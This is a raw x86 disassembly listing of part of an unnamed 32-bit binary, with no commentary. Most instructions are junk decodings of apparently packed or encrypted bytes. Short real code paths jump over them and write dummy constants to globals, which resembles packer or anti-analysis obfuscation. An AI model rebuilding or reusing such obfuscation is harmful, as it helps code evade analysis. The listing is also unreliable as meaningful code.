  40dafa:	adc    eax,0x85ce444c
  40daff:	scas   al,BYTE PTR es:[edi]
  40db00:	push   cs
  40db01:	sar    BYTE PTR [eax+edx*1-0x1e],1
  40db05:	les    eax,FWORD PTR [esi+0x5d]
  40db08:	sub    al,0x98
  40db0a:	retf   0xc9db
  40db0d:	jb     0x40da92
  40db0f:	pop    es
  40db10:	cmp    eax,0x4219eaa2
  40db15:	pop    edi
  40db16:	lods   al,BYTE PTR ds:[esi]
  40db17:	mov    BYTE PTR ds:0xfa46fd76,cl
  40db1d:	or     BYTE PTR ds:0x7e97fd5,cl
  40db23:	sahf   
  40db24:	frstor [ecx]
  40db26:	outs   dx,DWORD PTR ds:[esi]
  40db27:	xchg   dl,bh
  40db29:	xchg   BYTE PTR [ebx],cl
  40db2b:	mov    ebp,0x16bef625
  40db30:	inc    ecx
  40db31:	rol    DWORD PTR [ebx+0x19e7f2df],1
  40db37:	cmp    al,0x4f
  40db39:	mov    BYTE PTR [edi],bl
  40db3b:	jnp    0x40db35
  40db3d:	dec    edx
  40db3e:	ds (bad) 
  40db40:	xlat   BYTE PTR ds:[ebx]
  40db41:	ss cmp eax,0xf8e14fb
  40db47:	mov    esp,0x2220ca00
  40db4c:	(bad)  
  40db4d:	dec    ebp
  40db4e:	and    eax,0x1c9a239c
  40db53:	sti    
  40db54:	cld    
  40db55:	mov    edi,0x71e971b1
  40db5a:	ror    BYTE PTR [edi+0x33954303],1
  40db60:	sbb    dh,dl
  40db62:	sbb    edx,DWORD PTR [esi+0x143398b6]
  40db68:	fcom   DWORD PTR [ecx+0x5c6a7d73]
  40db6e:	pop    ebp
  40db6f:	mov    bl,0x73
  40db71:	xchg   ecx,eax
  40db73:	push   esp
  40db74:	shr    BYTE PTR [ebp+0x6e],1
  40db77:	ret    0x6063
  40db7a:	ds popf 
  40db7c:	daa    
  40db7d:	mov    ebx,0x5fd267f0
  40db82:	mov    cl,BYTE PTR [ebp+0x5a0b93ee]
  40db88:	iret   
  40db89:	das    
  40db8a:	cs retf 0x27cf
  40db8e:	lds    eax,FWORD PTR [edx-0x76259356]
  40db94:	mov    ch,0x5e
  40db96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db97:	xchg   ecx,eax
  40db98:	push   eax
  40db99:	cmp    dh,BYTE PTR [edx]
  40db9b:	fwait
  40db9c:	popf   
  40db9d:	rdmsr  
  40db9f:	and    esi,DWORD PTR [edi-0x3]
  40dba2:	xchg   ebx,eax
  40dba3:	fwait
  40dba4:	cmp    al,BYTE PTR [ecx-0x67f97902]
  40dbaa:	loop   0x40dbf1
  40dbac:	aaa    
  40dbad:	push   ebp
  40dbae:	(bad)  
  40dbaf:	popf   
  40dbb0:	jmp    0x40db3e
  40dbb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbb4:	xchg   ecx,eax
  40dbb5:	cmp    eax,ecx
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi-0x5bbfeba4],0xfa94a68c
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dc23
  40dbe0:	mov    edi,0xc9f117b2
  40dbe5:	shl    edi,1
  40dbe7:	lock xchg ecx,eax
  40dbe9:	cli    
  40dbea:	into   
  40dbeb:	mov    eax,0xe7945e98
  40dbf0:	out    dx,eax
  40dbf1:	mov    al,0xac
  40dbf3:	add    eax,0x32d5aaa
  40dbf8:	add    eax,0xa85b0142
  40dbfd:	mov    WORD PTR [esi],ss
  40dbff:	pop    eax
  40dc00:	(bad)  
  40dc01:	jnp    0x40dc1a
  40dc03:	jne    0x40dc1e
  40dc05:	popa   
  40dc06:	out    dx,eax
  40dc07:	pop    ss
  40dc08:	ror    ch,cl
  40dc0a:	add    al,0xec
  40dc0c:	jle    0x40dbbb
  40dc0e:	loope  0x40dbe4
  40dc10:	(bad)  
  40dc11:	cld    
  40dc12:	push   eax
  40dc13:	sub    cl,0xd3
  40dc16:	in     eax,dx
  40dc17:	jle    0x40dc2c
  40dc19:	mov    esi,DWORD PTR [ebp+0x50]
  40dc1c:	pushf  
  40dc1d:	fucomi st,st(0)
  40dc1f:	push   0xd8c5f560
  40dc24:	push   edi
  40dc25:	sbb    BYTE PTR [esi],0x73
  40dc28:	cwde   
  40dc29:	mov    WORD PTR [esi+ebp*8+0x77],cs
  40dc2d:	stos   BYTE PTR es:[edi],al
  40dc2e:	call   0xa7a1:0x88910b55
  40dc35:	inc    ebp
  40dc36:	lock sbb esi,ecx
  40dc39:	push   0xffffff86
  40dc3b:	push   0x35
  40dc3d:	push   0xffffffc7
  40dc3f:	and    ebp,eax
  40dc41:	pop    esi
  40dc42:	cwde   
  40dc43:	inc    eax
  40dc44:	and    al,BYTE PTR [eax]
  40dc46:	call   0x9c5c02be
  40dc4b:	sbb    ecx,DWORD PTR [ebx]
  40dc4d:	xor    DWORD PTR [edx+0x72],ebp
  40dc50:	mov    ?,WORD PTR [ebp-0x57]
  40dc53:	(bad)  
  40dc54:	xor    eax,0x7f4136bd
  40dc59:	out    0xd2,eax
  40dc5b:	xor    edi,esi
  40dc5d:	jae    0x40dbe1
  40dc5f:	inc    ebp
  40dc60:	or     esp,DWORD PTR [esi]
  40dc62:	stc    
  40dc63:	(bad)  
  40dc64:	jp     0x40dc89
  40dc66:	or     DWORD PTR [edi-0xe],ebp
  40dc69:	test   BYTE PTR ds:0x7f00e93,al
  40dc6f:	sbb    DWORD PTR [esi+0x3b],esi
  40dc72:	pop    edx
  40dc73:	imul   esi,DWORD PTR [ecx-0x5c],0xbbf8159d
  40dc7a:	xchg   DWORD PTR [ebx+edx*1-0x3b0bd83d],ebp
  40dc81:	lods   eax,DWORD PTR ds:[esi]
  40dc82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc83:	cld    
  40dc84:	cwde   
  40dc85:	das    
  40dc86:	sbb    DWORD PTR [ebx],edi
  40dc88:	inc    ecx
  40dc89:	adc    edx,DWORD PTR [ecx+0x5b]
  40dc8c:	push   edx
  40dc8d:	(bad)  
  40dc8e:	sti    
  40dc8f:	mov    edx,DWORD PTR ds:0xee3c73be
  40dc95:	push   ds
  40dc96:	mov    cl,0x17
  40dc98:	or     al,0xa4
  40dc9a:	and    edi,DWORD PTR [ebx-0x333e644d]
  40dca0:	pop    es
  40dca1:	pop    esi
  40dca2:	out    0x9a,eax
  40dca4:	add    eax,0x7b9feab0
  40dca9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcaa:	iret   
  40dcab:	mov    esp,0x5f91ae9e
  40dcb0:	xchg   ebx,eax
  40dcb1:	repz (bad) 
  40dcb3:	aaa    
  40dcb4:	fsubr  st(1),st
  40dcb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dcb7:	cmc    
  40dcb8:	xchg   BYTE PTR [ebx-0x4b],al
  40dcbb:	sub    BYTE PTR [eax],ch
  40dcbd:	dec    edi
  40dcbe:	sub    eax,DWORD PTR [ebx+esi*8+0x4f]
  40dcc2:	mov    al,ds:0x81eea2d8
  40dcc7:	mov    dl,0xec
  40dcc9:	mov    ds:0x5990f3dc,eax
  40dcce:	in     eax,0x37
  40dcd0:	jnp    0x40dcc5
  40dcd2:	popf   
  40dcd3:	shr    ecx,0x50
  40dcd6:	xchg   esp,eax
  40dcd7:	push   cs
  40dcd8:	mul    BYTE PTR [edi]
  40dcda:	sbb    eax,0xcb0606bc
  40dcdf:	out    dx,al
  40dce0:	mov    ds:0x5620afd6,al
  40dce5:	out    0xd2,al
  40dce7:	sar    DWORD PTR [edx+0x2241b863],0x9c
  40dcee:	rol    DWORD PTR [ebx],0x24
  40dcf1:	data16 mov dl,0x2d
  40dcf4:	stos   BYTE PTR es:[edi],al
  40dcf5:	fucomi st,st(1)
  40dcf7:	mov    ds:0x30afc28a,eax
  40dcfc:	mov    eax,ds:0xd21f45c8
  40dd01:	sbb    dl,bh
  40dd03:	pop    ds
  40dd04:	push   ss
  40dd05:	shl    DWORD PTR [ecx+eiz*2+0xb],cl
  40dd09:	xor    BYTE PTR [esp+ebp*1],0xf8
  40dd0d:	sbb    DWORD PTR [ebp+0x22215ffd],0xffffffae
  40dd14:	test   eax,0xe6396ec2
  40dd19:	scas   eax,DWORD PTR es:[edi]
  40dd1a:	adc    dl,BYTE PTR [eax+edi*1+0x12]
  40dd1e:	sub    bh,BYTE PTR ds:0x39f732ce
  40dd24:	(bad)  
  40dd25:	int3   
  40dd26:	adc    ch,BYTE PTR [eax+0x78]
  40dd29:	hlt    
  40dd2a:	or     al,0xb6
  40dd2c:	lahf   
  40dd2d:	add    BYTE PTR [eax+0x43],dh
  40dd30:	dec    ebx
  40dd31:	mov    es,WORD PTR ds:0x4d094ff3
  40dd37:	or     BYTE PTR [ebx+0x661f6d02],cl
  40dd3d:	push   ecx
  40dd3e:	dec    esp
  40dd3f:	paddw  mm7,mm7
  40dd42:	mov    al,ds:0xbb602e07
  40dd47:	add    DWORD PTR [edi-0x6d],edi
  40dd4a:	xor    eax,0x9be2bdf4
  40dd4f:	cmc    
  40dd50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd51:	cld    
  40dd52:	jmp    0x9bac:0x422b989d
  40dd59:	push   ds
  40dd5a:	out    0xda,eax
  40dd5c:	or     eax,0xf85b6ef8
  40dd61:	fnstenv [edx-0x36bece85]
  40dd67:	and    eax,0x57d09bcc
  40dd6c:	dec    edi
  40dd6d:	cmp    al,0xa6
  40dd6f:	inc    eax
  40dd70:	jle    0x40ddec
  40dd72:	mov    DWORD PTR [eax-0x49],esi
  40dd75:	ins    BYTE PTR es:[edi],dx
  40dd76:	mov    eax,0x48b2bd00
  40dd7b:	sub    DWORD PTR [ebx+0x2d4e46c0],0x15
  40dd82:	or     ah,BYTE PTR [ebp-0xa]
  40dd85:	stc    
  40dd86:	scas   al,BYTE PTR es:[edi]
  40dd87:	ficomp WORD PTR ds:[ebx]
  40dd8a:	pop    ebx
  40dd8b:	cld    
  40dd8c:	or     DWORD PTR [esi+0x42ac13a6],esi
  40dd92:	loopne 0x40dd88
  40dd94:	jmp    0xb5f:0xe4a242d6
  40dd9b:	mov    esp,0x9f7e280c
  40dda0:	icebp  
  40dda1:	inc    edx
  40dda2:	sub    cl,BYTE PTR [edx+0x1e6a5088]
  40dda8:	addr16 sbb al,0x4d
  40ddab:	inc    edx
  40ddac:	dec    ebx
  40ddad:	fs push ebx
  40ddaf:	jb     0x40dd58
  40ddb1:	cmp    dl,BYTE PTR [ebx]
  40ddb3:	out    dx,eax
  40ddb4:	cmp    ebx,edx
  40ddb6:	call   0x5e70:0xbe8f54f7
  40ddbd:	jl     0x40dde9
  40ddbf:	out    0x3b,al
  40ddc1:	push   eax
  40ddc2:	dec    ecx
  40ddc3:	imul   esp,DWORD PTR [ebx-0x25],0xffffffaa
  40ddc7:	xor    BYTE PTR [edx-0x15],bh
  40ddca:	mov    dl,0xab
  40ddcc:	aam    0x14
  40ddce:	imul   esi,DWORD PTR [ebx-0x7f8f9dba],0x18
  40ddd5:	call   0x3955e110
  40ddda:	xchg   ebx,eax
  40dddb:	jno    0x40dd9d
  40dddd:	add    BYTE PTR [ebp-0x41],al
  40dde0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dde1:	pop    ds
  40dde2:	jl     0x40ddc2
  40dde4:	pop    esp
  40dde5:	cs add al,0x4d
  40dde8:	jge    0x40ddd3
  40ddea:	(bad)  
  40ddeb:	dec    edi
  40ddec:	add    dh,BYTE PTR [ecx-0x3b]
  40ddef:	mov    ah,0xdf
  40ddf1:	push   edi
  40ddf2:	ret    0xd8b2
  40ddf5:	dec    edi
  40ddf6:	ret    
  40ddf7:	adc    eax,0x8bf2363e
  40ddfc:	call   0xdf7f:0x355dcbb3
  40de03:	hlt    
  40de04:	jl     0x40ddf2
  40de06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de07:	or     esp,DWORD PTR [edi]
  40de09:	call   0x5c4694da
  40de0e:	xchg   ebp,eax
  40de0f:	mov    cl,0xab
  40de11:	pop    es
  40de12:	pop    edi
  40de13:	repnz stc 
  40de15:	jae    0x40de29
  40de17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de18:	dec    ebx
  40de19:	and    BYTE PTR [esi],ch
  40de1b:	xor    BYTE PTR [ebp+0x70],bh
  40de1e:	lsl    eax,si
  40de21:	mov    ds:0x413bb8,eax
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43379f,0x0
  40de5a:	mov    eax,ds:0x43379f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43379f,eax
  40de65:	cmp    DWORD PTR ds:0x43379f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43379f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4337ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	div    DWORD PTR ds:0xba29fb72
  40deab:	pushf  
  40deac:	jle    0x40df2c
  40deae:	adc    bh,BYTE PTR [edi+0x7e]
  40deb1:	jle    0x40deb0
  40deb3:	cmp    cl,cl
  40deb5:	int    0x3d
  40deb7:	ret    0x8e9e
  40deba:	mov    ecx,0x3a6b3094
  40debf:	push   esp
  40dec0:	push   ds
  40dec1:	xchg   ebx,eax
  40dec2:	add    al,0xbb
  40dec4:	xchg   ecx,eax
  40dec5:	adc    eax,0x4858a21
  40deca:	sbb    eax,0xc6e3769e
  40decf:	and    eax,esp
  40ded1:	pop    ecx
  40ded2:	pop    ebx
  40ded3:	inc    esi
  40ded4:	stc    
  40ded5:	lea    ecx,[edx]
  40ded7:	std    
  40ded8:	out    0x30,eax
  40deda:	leave  
  40dedb:	mov    eax,ds:0x2421becc
  40dee0:	lods   eax,DWORD PTR ds:[esi]
  40dee1:	test   esi,ebx
  40dee3:	cmp    DWORD PTR [bp+di-0x57],0x5003af0a
  40deeb:	push   ebp
  40deec:	cwde   
  40deed:	xchg   edx,eax
  40deee:	push   ebx
  40deef:	inc    esi
  40def0:	lahf   
  40def1:	shl    BYTE PTR ds:0x93c0d546,1
  40def7:	lods   eax,DWORD PTR ds:[esi]
  40def8:	iret   
  40def9:	adc    eax,0x2b292c97
  40defe:	mov    eax,0x70eefb54
  40df03:	out    0x91,eax
  40df05:	cmc    
  40df06:	pop    edi
  40df07:	int    0xed
  40df09:	repz pop edi
  40df0b:	bound  esp,QWORD PTR [esi-0x63d9fbcf]
  40df11:	cmp    al,0xde
  40df13:	call   0xdd3642fa
  40df18:	mov    ebp,DWORD PTR [edx+0x7da33239]
  40df1e:	xor    ebx,eax
  40df20:	push   ecx
  40df21:	mov    cl,0x13
  40df23:	inc    esp
  40df24:	popa   
  40df25:	imul   DWORD PTR [edx]
  40df27:	ins    BYTE PTR es:[edi],dx
  40df28:	add    eax,0x569d20d4
  40df2d:	call   0x91e51298
  40df32:	sub    DWORD PTR [ebx+0x47612ecf],esp
  40df38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df39:	mov    esp,0xaed1037d
  40df3e:	mov    DWORD PTR [edx+0x35dfab2e],ecx
  40df44:	mov    ds:0x99b7066d,eax
  40df49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df4a:	add    cl,dl
  40df4c:	cmp    eax,0x4a75fa7
  40df51:	mov    eax,0x316dd75d
  40df56:	mov    edi,0xd41df300
  40df5b:	xor    ebp,DWORD PTR [edi-0x2b]
  40df5e:	lods   al,BYTE PTR ds:[esi]
  40df5f:	adc    al,0x5d
  40df61:	jb     0x40df2f
  40df63:	sbb    al,0xb1
  40df65:	push   ss
  40df66:	inc    esi
  40df67:	xchg   edx,eax
  40df68:	dec    DWORD PTR [eax+0x64e3050c]
  40df6e:	inc    esp
  40df6f:	mov    eax,DWORD PTR [eax+0x76da5623]
  40df75:	inc    edx
  40df76:	jp     0x40df9d
  40df78:	aam    0xc
  40df7a:	add    DWORD PTR [ecx+ebx*4],ebx
  40df7d:	pop    es
  40df7e:	data16 into 
  40df80:	xchg   edx,eax
  40df81:	adc    dl,cl
  40df83:	sti    
  40df84:	xor    bh,BYTE PTR [ecx-0x74]
  40df87:	sar    BYTE PTR [esp+ebx*1],1
  40df8a:	or     dx,WORD PTR cs:[ebp+0x2edc6d8d]
  40df92:	mov    ecx,0xf33369cb
  40df97:	mov    esi,0x3cbcd3d2
  40df9c:	jecxz  0x40df66
  40df9e:	xor    al,0xa2
  40dfa0:	add    DWORD PTR [edi-0x4f537a6b],eax
  40dfa6:	xchg   edi,eax
  40dfa7:	jnp    0x40dfb5
  40dfa9:	rol    BYTE PTR [edx+edi*1-0x395e1beb],0x95
  40dfb1:	sbb    eax,0x6cf47385
  40dfb6:	test   dh,bh
  40dfb8:	push   edx
  40dfb9:	sub    BYTE PTR [edx-0x4f],ch
  40dfbc:	mov    bh,0xd9
  40dfbe:	cmp    dl,BYTE PTR [ecx]
  40dfc0:	mov    bh,0x7f
  40dfc2:	mov    bh,0xd5
  40dfc4:	(bad)  
  40dfc5:	fmul   DWORD PTR [edi+ebp*8+0x6f]
  40dfc9:	or     BYTE PTR [edi+ebx*2+0x4b],al
  40dfcd:	ins    BYTE PTR es:[edi],dx
  40dfce:	mov    eax,DWORD PTR [ebp+0x8]
  40dfd1:	sub    DWORD PTR ds:0x433797,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x4337eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	or     edi,DWORD PTR [esi-0x62a14c4b]
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e080
  40e010:	adc    ecx,DWORD PTR [esi+0x5aa1ba09]
  40e016:	adc    al,0x57
  40e018:	pop    ecx
  40e019:	pop    ds
  40e01a:	sbb    al,0x2e
  40e01c:	scas   eax,DWORD PTR es:[edi]
  40e01d:	add    eax,0x7f1ac8a2
  40e022:	pop    edi
  40e023:	xor    ch,BYTE PTR [ecx-0x14]
  40e026:	pop    edi
  40e027:	pop    ecx
  40e028:	mov    edi,0x43937cb
  40e02d:	div    DWORD PTR [ebx+0x23a4bf14]
  40e033:	shl    DWORD PTR es:[ebx+ebp*1],1
  40e037:	out    0x67,eax
  40e039:	test   al,0xb4
  40e03b:	jg     0x40e068
  40e03d:	push   edi
  40e03e:	xchg   ecx,eax
  40e03f:	inc    esi
  40e040:	es repnz inc ebp
  40e043:	inc    DWORD PTR [ecx+0x43]
  40e046:	push   esi
  40e047:	cmp    ch,dl
  40e049:	retf   
  40e04a:	les    ebx,FWORD PTR [esi]
  40e04c:	mov    edx,0xc821383e
  40e051:	pop    esp
  40e052:	imul   eax,DWORD PTR [ecx+0x79e38f6],0xcc878cdb
  40e05c:	loopne 0x40e098
  40e05e:	jge    0x40e072
  40e060:	icebp  
  40e061:	imul   esp,edi,0x6fe4e985
  40e067:	call   0x9904:0xf2f6d446
  40e06e:	or     BYTE PTR [edi-0x5df170aa],al
  40e074:	mov    ebx,0x67dbacd8
  40e079:	ja     0x40e09d
  40e07b:	sbb    al,0xe6
  40e07d:	pop    ebx
  40e07e:	mov    ch,BYTE PTR [eax-0x6d]
  40e081:	ret    
  40e082:	or     BYTE PTR [edi-0x1d],dl
  40e085:	sahf   
  40e086:	dec    ebx
  40e087:	pop    edx
  40e088:	and    edx,ebx
  40e08a:	jp     0x40e0e8
  40e08c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e08d:	stos   DWORD PTR es:[edi],eax
  40e08e:	push   es
  40e08f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e090:	cld    
  40e091:	sbb    eax,0xa6bc6ce6
  40e096:	ins    DWORD PTR es:[edi],dx
  40e097:	and    eax,0x990c1349
  40e09c:	fs lock sub BYTE PTR cs:[edi+esi*2],cl
  40e0a2:	sub    DWORD PTR [edx],eax
  40e0a4:	mov    bh,dl
  40e0a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0a7:	push   es
  40e0a8:	dec    edi
  40e0a9:	jmp    0x7178:0x94b32e40
  40e0b0:	jmp    0x76e63a83
  40e0b5:	jne    0x40e078
  40e0b7:	pop    edi
  40e0b8:	out    0x8f,al
  40e0ba:	test   BYTE PTR [ecx+0x3d],dl
  40e0bd:	or     eax,0xc2001c69
  40e0c2:	ins    BYTE PTR es:[edi],dx
  40e0c3:	jb     0x40e049
  40e0c5:	dec    ebx
  40e0c6:	dec    edi
  40e0c7:	pop    edx
  40e0c8:	cmc    
  40e0c9:	jecxz  0x40e0b8
  40e0cb:	idiv   BYTE PTR [esi-0x53]
  40e0ce:	(bad)  
  40e0cf:	cdq    
  40e0d0:	cmp    bh,bh
  40e0d2:	jae    0x40e06a
  40e0d4:	out    0xb,al
  40e0d6:	pop    esi
  40e0d7:	(bad)  
  40e0d8:	dec    ecx
  40e0d9:	or     DWORD PTR [ebp+edi*1+0x55],ebx
  40e0dd:	mov    ebx,0x287565d1
  40e0e2:	fbld   TBYTE PTR [ebp-0x53]
  40e0e5:	out    0x60,eax
  40e0e7:	xor    ch,bl
  40e0e9:	fsubp  st(5),st
  40e0eb:	jno    0x40e156
  40e0ed:	sub    eax,0xb03d8fff
  40e0f2:	sbb    DWORD PTR [ebp+0x36],0xfb3c0ccf
  40e0f9:	aaa    
  40e0fa:	cs inc edi
  40e0fc:	retf   0xd309
  40e0ff:	inc    ebp
  40e100:	or     edi,eax
  40e102:	sub    al,0x96
  40e104:	mov    al,ds:0x7e165bf7
  40e109:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e10a:	lahf   
  40e10b:	sbb    edi,DWORD PTR [eax+esi*2+0x664cdff2]
  40e112:	add    edi,DWORD PTR [esi]
  40e114:	cmp    edi,DWORD PTR [edi+0x35]
  40e117:	loop   0x40e0df
  40e119:	sub    eax,0x80649b02
  40e11e:	les    edi,FWORD PTR [edi]
  40e120:	ja     0x40e0b4
  40e122:	push   cs
  40e123:	in     eax,dx
  40e124:	jb     0x40e124
  40e126:	pop    ebx
  40e127:	pop    eax
  40e128:	sti    
  40e129:	retf   0x33ae
  40e12c:	mov    BYTE PTR [ecx+0x4337a315],0x0
  40e133:	xchg   edi,eax
  40e134:	and    BYTE PTR [eax],al
  40e136:	add    BYTE PTR [ebx+0x32729b],bh
  40e13c:	xor    DWORD PTR ds:0x4337ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	or     eax,0x7257d317
  40e15f:	call   0x7e7e:0x7f127e7e
  40e166:	xor    al,0xc4
  40e168:	out    0xb2,eax
  40e16a:	mov    edx,DWORD PTR [esp+edi*8-0x11]
  40e16e:	leave  
  40e16f:	call   0x125b:0x63ee7e9f
  40e176:	stc    
  40e177:	les    esp,FWORD PTR [ebx]
  40e179:	xor    DWORD PTR [eax+0x58925e31],ecx
  40e17f:	mov    WORD PTR [edx+0x66ed2bf5],cs
  40e185:	mov    eax,0xdc654dda
  40e18a:	sub    eax,0x9ac842a0
  40e18f:	pushf  
  40e190:	dec    ebx
  40e191:	and    BYTE PTR [ebp+0x7d],al
  40e194:	push   0xffffffa0
  40e196:	and    DWORD PTR [edi+0x5d],esi
  40e199:	lahf   
  40e19a:	test   eax,0xfa5a2752
  40e19f:	mov    cl,0x26
  40e1a1:	stc    
  40e1a2:	pusha  
  40e1a3:	mov    ecx,0x87697379
  40e1a8:	ficomp WORD PTR [ebx+0x78e55d50]
  40e1ae:	test   DWORD PTR [esi-0x55cf892f],eax
  40e1b4:	jg     0x40e1ac
  40e1b6:	sub    DWORD PTR cs:[edx],0x96c48ec9
  40e1bd:	das    
  40e1be:	push   0xffffff8a
  40e1c0:	mov    BYTE PTR [edx+ebp*2+0xb42a22],0x63
  40e1c8:	add    edx,DWORD PTR [ebx+0x1bb775aa]
  40e1ce:	sbb    eax,0x348a6cf5
  40e1d3:	cwde   
  40e1d4:	xor    ebp,DWORD PTR [edx]
  40e1d6:	dec    ebx
  40e1d7:	int3   
  40e1d8:	dec    esp
  40e1d9:	xor    ah,BYTE PTR [eax-0x3def78fd]
  40e1df:	add    BYTE PTR [esi-0x23c75e23],0x73
  40e1e6:	rcr    BYTE PTR [ecx+esi*8+0x6f036900],cl
  40e1ed:	stos   BYTE PTR es:[edi],al
  40e1ee:	push   ds
  40e1ef:	xor    al,0xd0
  40e1f1:	cdq    
  40e1f2:	jo     0x40e179
  40e1f4:	cmp    DWORD PTR [ebx-0xe1b050d],esp
  40e1fa:	shl    DWORD PTR ds:[edi+0x3da81255],1
  40e201:	and    al,0xd
  40e203:	push   ebx
  40e204:	call   0x7838:0x27ae1c1a
  40e20b:	(bad)  
  40e20c:	jmp    0xe6fd:0x8ee33317
  40e213:	sbb    ch,bh
  40e215:	xlat   BYTE PTR ds:[bx]
  40e217:	dec    esp
  40e218:	push   edx
  40e219:	mov    DWORD PTR [esi],0x5743b191
  40e21f:	aaa    
  40e220:	out    dx,al
  40e221:	ja     0x40e285
  40e223:	pop    eax
  40e224:	mov    edi,0x4e060073
  40e229:	push   edx
  40e22a:	lods   al,BYTE PTR ds:[esi]
  40e22b:	and    DWORD PTR [esi-0x5f],ecx
  40e22e:	stos   BYTE PTR es:[edi],al
  40e22f:	lahf   
  40e230:	arpl   WORD PTR [esi],bp
  40e232:	popa   
  40e233:	push   es
  40e234:	jl     0x40e264
  40e236:	push   ss
  40e237:	jmp    0x40e233
  40e239:	into   
  40e23a:	lods   eax,DWORD PTR ds:[esi]
  40e23b:	lock jns 0x40e22d
  40e23e:	inc    esp
  40e23f:	sub    DWORD PTR [eax+0x13],edx
  40e242:	repnz inc edi
  40e244:	or     BYTE PTR [edx+0x36],bh
  40e247:	pop    edx
  40e248:	pop    ds
  40e249:	sbb    BYTE PTR [esi+0x43e21af],ah
  40e24f:	and    dl,BYTE PTR [ebx+0x653cde7a]
  40e255:	mov    al,ds:0xfb4864c6
  40e25a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e25b:	sub    edi,ebp
  40e25d:	mov    ebx,0xf0d25301
  40e262:	sub    eax,0x72955fc1
  40e267:	ror    bh,0x71
  40e26a:	xlat   BYTE PTR ds:[ebx]
  40e26b:	div    BYTE PTR [eax+ebx*8+0x477829d9]
  40e272:	je     0x40e2d0
  40e274:	jl     0x40e2d3
  40e276:	ror    DWORD PTR [esi],1
  40e278:	or     edi,ebx
  40e27a:	(bad)  
  40e27b:	shr    al,1
  40e27d:	push   ss
  40e27e:	add    esi,DWORD PTR [ebp+0x4589e7bf]
  40e284:	call   0xff496014
  40e289:	add    eax,0x43370b
  40e28e:	xor    edi,esi
  40e290:	add    DWORD PTR ds:0x4337e3,0x2783
  40e29a:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e2a1:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e2a8:	dec    DWORD PTR ds:0x43382b
  40e2ae:	add    edi,ebx
  40e2b0:	mov    DWORD PTR ds:0x433797,0x5e0d
  40e2ba:	jmp    0x40e83c
  40e2bf:	cmp    edi,0x40
  40e2c2:	jne    0x40e31a
  40e2c8:	movzx  eax,BYTE PTR ds:0x43370b
  40e2cf:	mov    eax,ds:0x4139b4
  40e2d4:	mov    eax,DWORD PTR [eax]
  40e2d6:	mov    DWORD PTR ds:0x4337d7,0x3f94
  40e2e0:	mov    DWORD PTR [ebp-0x14],eax
  40e2e3:	mov    DWORD PTR ds:0x43379f,0x877
  40e2ed:	mov    eax,ds:0x413bbc
  40e2f2:	mov    DWORD PTR ds:0x43371b,0x4b6e
  40e2fc:	mov    eax,DWORD PTR [eax]
  40e2fe:	mov    DWORD PTR ds:0x43381f,0x73ce
  40e308:	mov    DWORD PTR [ebp-0x18],eax
  40e30b:	mov    DWORD PTR ds:0x43382b,0x7077
  40e315:	jmp    0x40e830
  40e31a:	mov    DWORD PTR ds:0x4337df,0xab2
  40e324:	cmp    edi,0x33d
